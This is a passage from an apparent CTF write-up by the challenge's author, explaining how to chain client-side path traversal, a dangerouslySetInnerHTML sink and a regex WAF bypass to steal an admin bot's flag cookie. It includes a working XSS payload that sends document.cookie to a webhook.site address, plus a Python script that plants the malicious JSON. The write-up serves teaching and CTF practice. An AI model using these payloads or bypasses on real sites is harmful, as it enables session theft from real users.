+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@report_bp.route</span><span class="p">(</span><span class="s1">&#39;/report&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">report</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">}),</span> <span class="mi">401</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">base_domain</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;BASE_DOMAIN&#39;</span><span class="p">,</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">reported_domain</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">reported_domain</span> <span class="o">!=</span> <span class="n">base_domain</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s2">&#34;Invalid URL - Domain does not match&#34;</span><span class="p">}),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># ... admin login ...</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">flag_cookie</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;flag&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;FLAG&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;domain&#39;</span><span class="p">:</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;report.report&#39;</span><span class="p">,</span> <span class="n">_external</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span><span class="o">.</span><span class="n">hostname</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;httpOnly&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;secure&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;sameSite&#39;</span><span class="p">:</span> <span class="s1">&#39;Strict&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">add_cookies</span><span class="p">([</span><span class="n">cookie</span><span class="p">,</span> <span class="n">flag_cookie</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">wait_until</span><span class="o">=</span><span class="s2">&#34;networkidle&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span></span></span></code></pre></div></div>
+<p>The bot visits our URL with the flag stored in a cookie!</p>
+<hr>
+<h2 id="the-path-to-the-flag">The Path to the Flag</h2>
+<h3 id="discovery-1-the-xss-sink">Discovery #1: The XSS Sink</h3>
+<p>First, I noticed the Next.js frontend was using <code>dangerouslySetInnerHTML</code> to render the <code>successMessage</code>. This is a known XSS sink if we can control that value.</p>
+<p>The <code>successMessage</code> comes from the backend API response&rsquo;s <code>message</code> field. Any API endpoint that returns a <code>message</code> field will have that content rendered as raw HTML. So if we can make the bot visit a URL that returns our XSS payload in a message field, we win.</p>
+<h3 id="discovery-2-finding-urls-that-return-our-payload">Discovery #2: Finding URLs That Return Our Payload</h3>
+<p>Now I need to find a URL that will return my XSS payload in a <code>message</code> field. Looking through the backend, I found <code>/api/admin_debug?query=</code> which echoes the query parameter:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;filename&#39;</span><span class="p">:</span> <span class="n">file</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">],</span> <span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="n">query_param</span><span class="p">})</span></span></span></code></pre></div></div>
+<p>So if the bot visits <code>/api/admin_debug?query=&lt;img src=x onerror=alert()&gt;</code>, the API returns <code>{message: &quot;&lt;img src=x onerror=alert()&gt;&quot;}</code>, and the frontend will render it as HTML. But the bot only visits URLs we report to it - can we make it visit this API URL instead of a normal page?</p>
+<h3 id="discovery-3-client-side-path-traversal-cspt---making-the-bot-visit-unintended-urls">Discovery #3: Client-Side Path Traversal (CSPT) - Making the Bot Visit Unintended URLs</h3>
+<p>Here&rsquo;s where it gets interesting. Looking at the minified frontend code:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">l</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">t</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="nx">l</span><span class="p">}</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">e</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">a</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">l</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">o</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">s</span><span class="p">.</span><span class="nx">fileService</span><span class="p">.</span><span class="nx">getFile</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;object&#34;</span> <span class="o">!=</span> <span class="k">typeof</span> <span class="nx">o</span> <span class="o">?</span> <span class="p">(</span><span class="nx">t</span> <span class="o">=</span> <span class="p">(</span><span class="nx">n</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">o</span><span class="p">)).</span><span class="nx">content</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nx">filename</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="nx">t</span> <span class="o">=</span> <span class="nx">o</span><span class="p">.</span><span class="nx">content</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">o</span><span class="p">.</span><span class="nx">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">c</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">s</span><span class="p">.</span><span class="nx">fileService</span><span class="p">.</span><span class="nx">updateVisits</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">t</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">r</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Failed to fetch files&#34;</span><span class="p">,</span> <span class="nx">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></div></div>
+<p>Breaking down the minified variables:</p>
+<ul>
+<li><code>l</code> = file ID from URL params</li>
+<li><code>a</code> = decoded ID: <code>decodeURIComponent(l)</code></li>
+<li><code>o</code> = response from <code>getFile(a)</code></li>
+<li><code>n</code> = parsed JSON object</li>
+<li><code>i</code> = filename extracted from JSON: <code>n.filename</code></li>
+<li><code>t</code> = content extracted from JSON: <code>n.content</code></li>
+<li><code>c</code> = response from <code>updateVisits(i, t)</code></li>
+<li><code>r(c.message)</code> = sets the message state</li>
+</ul>
+<p>Notice the crucial detail: <strong>the frontend extracts a <code>filename</code> field from the JSON response, then uses it in a second API call</strong>. This <code>filename</code> can be any string - including a path traversal!</p>
+<h4 id="understanding-the-three-piece-puzzle">Understanding the Three-Piece Puzzle</h4>
+<p>This CSPT vulnerability relies on three interconnected pieces:</p>
+<p><strong>Piece 1: The JSON Parsing Endpoint</strong></p>
+<p>Remember that interesting endpoint we noted earlier?</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@file_bp.route</span><span class="p">(</span><span class="s1">&#39;/files/content/&lt;string:filename&gt;&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_file_content</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">file</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]))</span>  <span class="c1"># Parses stored content as JSON!</span></span></span></code></pre></div></div>
+<p>This is critical because it means <strong>we control the entire response structure</strong>. Whatever JSON we store in the file content will be parsed and returned as-is.</p>
+<p><strong>Piece 2: The Frontend Trust</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="s2">&#34;object&#34;</span> <span class="o">!=</span> <span class="k">typeof</span> <span class="nx">o</span> <span class="o">?</span> <span class="p">(</span><span class="nx">t</span> <span class="o">=</span> <span class="p">(</span><span class="nx">n</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">o</span><span class="p">)).</span><span class="nx">content</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nx">filename</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="nx">t</span> <span class="o">=</span> <span class="nx">o</span><span class="p">.</span><span class="nx">content</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">o</span><span class="p">.</span><span class="nx">filename</span><span class="p">);</span></span></span></code></pre></div></div>
+<p>The frontend blindly trusts the <code>filename</code> field from the API response:</p>
+<ul>
+<li>Fetches our file from <code>/api/files/content/{fileId}</code></li>
+<li>Receives our controlled JSON: <code>{&quot;filename&quot;: &quot;../../api/admin_debug?query=&lt;XSS&gt;&quot;, &quot;content&quot;: &quot;...&quot;}</code></li>
+<li>Extracts: <code>i = n.filename</code> <strong>← We control this!</strong></li>
+<li>No validation that <code>i</code> is actually a filename and not a path traversal!</li>
+</ul>
+<p><strong>Piece 3: The Unsafe Usage &amp; Message Rendering</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">c</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">s</span><span class="p">.</span><span class="nx">fileService</span><span class="p">.</span><span class="nx">updateVisits</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">t</span><span class="p">);</span>  <span class="c1">// Uses our malicious path!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">r</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">message</span><span class="p">)</span>  <span class="c1">// Sets state with the response message
+</span></span></span></code></pre></div></div>
+<p>Then later:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">t</span><span class="p">.</span><span class="nx">jsx</span><span class="p">)(</span><span class="s2">&#34;div&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">dangerouslySetInnerHTML</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">__html</span><span class="o">:</span> <span class="nx">n</span>  <span class="c1">// Renders the message as HTML!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span></span></span></code></pre></div></div>
+<p>The frontend uses our controlled <code>filename</code> value to construct an API request, then renders the response&rsquo;s <code>message</code> field as raw HTML using <code>dangerouslySetInnerHTML</code>.</p>
+<h4 id="the-full-exploit-chain">The Full Exploit Chain</h4>
+<ol>
+<li>Create a file with JSON: <code>{&quot;filename&quot;: &quot;../../api/admin_debug?query=&lt;XSS&gt;&quot;, &quot;content&quot;: &quot;...&quot;}</code></li>
+<li>Report URL: <code>http://frontend/files/{fileId}</code></li>
+<li>Frontend calls <code>getFile(a)</code> which fetches <code>/api/files/content/{fileId}</code></li>
+<li>Backend returns our JSON (Piece 1: JSON parsing endpoint)</li>
+<li>Frontend parses JSON: <code>i = n.filename</code> → <code>i = &quot;../../api/admin_debug?query=&lt;XSS&gt;&quot;</code> (Piece 2: Trusting JSON)</li>
+<li>Frontend calls <code>updateVisits(i, t)</code> which requests <code>/api/files/../../api/admin_debug?query=&lt;XSS&gt;</code></li>
+<li>Path resolves to <code>/api/admin_debug?query=&lt;XSS&gt;</code> - <strong>unintended URL!</strong></li>
+<li><code>/admin_debug</code> returns <code>{message: &quot;&lt;XSS&gt;&quot;}</code> - query parameter echoed in message field</li>
+<li>Frontend calls <code>r(c.message)</code> which sets the state</li>
+<li>Message rendered with <code>dangerouslySetInnerHTML</code> → <strong>XSS executes!</strong> (Piece 3: Unsafe rendering)</li>
+</ol>
+<p><strong>The key insight</strong>: We inject a malicious path into JSON → Frontend trusts the JSON without validation → Frontend makes request to our malicious path → Response message contains XSS → Unsafe rendering executes the XSS!</p>
+<h3 id="discovery-4-bypassing-the-waf-to-store-malicious-json">Discovery #4: Bypassing the WAF to Store Malicious JSON</h3>
+<p>There&rsquo;s a WAF on the file creation endpoint:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;waf to filter for xss&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">input</span> <span class="o">=</span> <span class="n">unquote_plus</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">input</span> <span class="o">=</span> <span class="nb">input</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;(?:\b[a-zA-Z_]\w*[\s\/</span><span class="se">\\</span><span class="s1">]*\()|&#39;</span>  <span class="c1"># Function calls with parentheses</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;(?:&lt;\s*[a-zA-Z]+(?:\s|&gt;))|&#39;</span>      <span class="c1"># HTML opening tags</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;(?:&lt;[^&gt;]*\s[^&gt;]*&gt;)&#39;</span><span class="p">,</span>             <span class="c1"># HTML tags with attributes</span>
+</span></span><span class="line"><span class="cl">        <span class="n">re</span><span class="o">.</span><span class="n">I</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>We need to store JSON like <code>{&quot;filename&quot;: &quot;../../api/admin_debug?query=&lt;img src=x onerror=...&gt;&quot;, &quot;content&quot;: &quot;...&quot;}</code> but the WAF is designed to block XSS patterns. Let&rsquo;s analyze each regex pattern:</p>
+<ol>
+<li><code>(?:\b[a-zA-Z_]\w*[\s\/\\]*\()</code> - Detects function calls like <code>alert(</code>, <code>fetch(</code>, <code>onerror(</code></li>
+<li><code>(?:&lt;\s*[a-zA-Z]+(?:\s|&gt;))</code> - Detects HTML tags like <code>&lt;img </code>, <code>&lt;script&gt;</code></li>
+<li><code>(?:&lt;[^&gt;]*\s[^&gt;]*&gt;)</code> - Detects HTML tags with attributes like <code>&lt;img src=x&gt;</code></li>
+</ol>
+<p><strong>The WAF bypass techniques:</strong></p>
+<p>There are countless techniques to bypass WAFs, but this challenge wasn&rsquo;t designed to be impossible - my goal was to showcase an interesting technique I discovered during a real-world bug bounty hunting scenario. The WAF was intentionally crafted to be bypassable with creative thinking rather than brute force.</p>
+<p>Here are the techniques used in my intended solution:</p>
+<h4 id="technique-1-slash-before-attribute-name">Technique 1: Slash Before Attribute Name</h4>
+<p>Instead of <code>&lt;img src='x'&gt;</code>, use <code>&lt;img/src='x'&gt;</code>. The slash makes it bypass pattern #3 because:</p>
+<ul>
+<li>Pattern #3 looks for: <code>&lt;</code> + any chars + <strong>space</strong> + any chars + <code>&gt;</code></li>
+<li>Our payload: <code>&lt;img/src='a'&gt;</code> has a <code>/</code> before the attribute, not a space</li>
+<li>Result: Doesn&rsquo;t match as &ldquo;HTML tag with attributes&rdquo;</li>
+</ul>
+<p>This is a relatively straightforward bypass, but it&rsquo;s effective against regex patterns that expect standard HTML formatting.</p>
+<h4 id="technique-2-optional-chaining-for-function-calls">Technique 2: Optional Chaining for Function Calls</h4>
+<p>Instead of <code>onerror=fetch(...)</code> which matches pattern #1 (function call with parentheses), use:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">onerror</span><span class="o">=</span><span class="nx">fetch</span><span class="o">?</span><span class="p">.(</span><span class="sb">`...`</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>The optional chaining operator <code>?.</code> breaks the pattern because:</p>
+<ul>
+<li>Pattern #1 expects: word characters + optional whitespace/slashes + <code>(</code></li>
+<li>Our payload: <code>fetch?.(</code> has <code>?</code> and <code>.</code> between the function name and <code>(</code></li>
+<li>The regex doesn&rsquo;t expect modern JavaScript syntax like optional chaining!</li>
+</ul>
+<p>I originally used this technique during bug bounty hunting in a collaboration with a friend and wrote about it here:<br>
+<strong><a href="https://f0dh1l.github.io/blog/posts/first-h1-bounty/" target="_blank" rel="noopener noreffer ">https://f0dh1l.github.io/blog/posts/first-h1-bounty/</a></strong></p>
+<h4 id="alternative-solutions-from-players">Alternative Solutions from Players</h4>
+<p>For the record, technique #1 is fairly trivial, but technique #2 (optional chaining) is not really. Most players who solved the challenge used alternative approaches:</p>
+<ul>
+<li><strong>Bracket notation</strong> instead of dot notation to access objects (e.g., <code>window['fetch']</code>)</li>
+<li><strong>Reflect API</strong> to invoke functions dynamically: <code>Reflect.get(window, 'fetch')</code><br>
+Read more: <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect" target="_blank" rel="noopener noreffer ">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Reflect</a></li>
+</ul>
+<p>These creative solutions highlight that WAF bypasses often have multiple valid approaches, each exploiting different aspects of how the filter is verifying JavaScript syntax and also its a proof that javascript is the weirdest language on earth.</p>
+<p><strong>My final payload:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-html">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">&#39;a&#39;</span><span class="na">onerror</span><span class="o">=</span><span class="s">fetch?.(`https://webhook.site/YOUR-ID?q=${document.cookie}`)</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<p>Breaking it down:</p>
+<ul>
+<li><code>&lt;img/src='a'&gt;</code> - Slash before <code>src</code> avoids pattern #3</li>
+<li><code>onerror=</code> - Event handler</li>
+<li><code>fetch?.(</code> - Optional chaining avoids pattern #1 (function call detection)</li>
+<li>Template literal with <code>${...}</code> for the cookie theft</li>
+</ul>
+<p>This payload cleverly bypasses the WAF without any URL encoding - just by using modern JavaScript syntax and strategic formatting!</p>
+<hr>
+<h2 id="building-the-exploit">Building the Exploit</h2>
+<h3 id="step-1-create-a-file-with-malicious-json">Step 1: Create a File with Malicious JSON</h3>
+<p>We need to create a file containing JSON with a malicious <code>filename</code> field:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Our XSS payload in the query parameter</span>
+</span></span><span class="line"><span class="cl"><span class="n">xss_payload</span> <span class="o">=</span> <span class="s2">&#34;&lt;img/src=&#39;a&#39;onerror=fetch?.(`https://webhook.site/YOUR-ID?q=$</span><span class="si">{document.cookie}</span><span class="s2">`)&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The malicious path that will be used by the frontend</span>
+</span></span><span class="line"><span class="cl"><span class="n">malicious_path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;../../api/admin_debug?query=</span><span class="si">{</span><span class="n">xss_payload</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create JSON that will be parsed by the frontend</span>
+</span></span><span class="line"><span class="cl"><span class="n">malicious_json</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;filename&#34;</span><span class="p">:</span> <span class="n">malicious_path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;content&#34;</span><span class="p">:</span> <span class="s2">&#34;dummy data&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Store it as a file</span>
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/files&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="n">malicious_json</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">file_id</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>The key: we&rsquo;re storing a JSON string that contains our malicious path in the <code>filename</code> field. When the frontend fetches this file, it will parse the JSON and use that filename in subsequent API calls!</p>
+<h3 id="step-2-report-the-file-url-to-the-bot">Step 2: Report the File URL to the Bot</h3>
+<p>Now we simply report the file URL to the bot:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Just point to our file - no path traversal in the URL itself!</span>
